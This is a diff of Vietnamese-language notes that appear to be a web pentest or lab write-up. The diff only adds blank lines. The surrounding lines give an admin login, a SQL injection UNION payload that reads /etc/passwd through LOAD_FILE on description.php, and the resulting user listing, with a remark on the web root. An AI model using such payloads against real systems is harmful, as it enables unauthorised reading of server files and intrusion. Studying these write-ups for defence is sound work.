@@ -70,6 +70,7 @@ Tài khoản  username = admin && password = 1234567890
 
 -	Check thử thư mục /etc/passwd
 payload: /description.php?ID=NEW' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,LOAD_FILE('/etc/passwd'),13,14,15-- -&category=new 
+
 Ta được:
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -83,7 +84,9 @@ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin (user chạy web, thư mục home là /var/www có thể là thư mục gốc của web )
+
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
